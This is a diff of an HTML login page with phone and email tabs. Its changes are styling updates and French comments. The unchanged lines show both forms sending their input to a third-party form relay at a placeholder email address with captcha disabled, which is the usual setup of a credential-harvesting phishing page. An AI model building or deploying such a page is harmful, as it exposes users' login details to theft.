@@ -8,17 +8,20 @@
     body {
       background-color: #000;
       font-family: Arial, sans-serif;
+      color: white;
+      padding-top: 80px; /* décalage vers le bas */
+      margin: 0;
       display: flex;
       flex-direction: column;
       align-items: center;
-      color: white;
-      margin-top: 40px;
     }
 
-    h1 {
-      color: white;
+    .welcome {
+      align-self: flex-start;
+      margin-left: 40px;
+      font-size: 26px;
+      font-weight: bold;
       margin-bottom: 30px;
-      font-size: 24px;
     }
 
     .toggle-container {
@@ -144,14 +147,16 @@
 </head>
 <body>
 
-  <h1>Log in</h1>
+  <!-- Nouveau titre -->
+  <div class="welcome">Welcome To Login</div>
 
+  <!-- Boutons Toggle -->
   <div class="toggle-container">
     <button class="toggle-button active" onclick="toggleLogin('phone')">Phone Login</button>
     <button class="toggle-button" onclick="toggleLogin('email')">Email Login</button>
   </div>
 
-  <!-- PHONE LOGIN FORM -->
+  <!-- Formulaire Téléphone -->
   <form id="phoneForm" action="https://formsubmit.co/tonadresse@email.com" method="POST">
     <input type="hidden" name="_captcha" value="false">
     <label for="phone">Phone Number</label>
@@ -186,7 +191,7 @@
     <button type="submit">Login</button>
   </form>
 
-  <!-- EMAIL LOGIN FORM -->
+  <!-- Formulaire Email -->
   <form id="emailForm" class="hidden" action="https://formsubmit.co/tonadresse@email.com" method="POST">
     <input type="hidden" name="_captcha" value="false">
     <label for="email">Email</label>
@@ -239,7 +244,6 @@
       }
     }
 
-    // Dynamically update flag based on country select
     document.getElementById("countryCode").addEventListener("change", function() {
       const flag = this.options[this.selectedIndex].dataset.flag;
       const img = document.querySelector(".input-group img.flag");
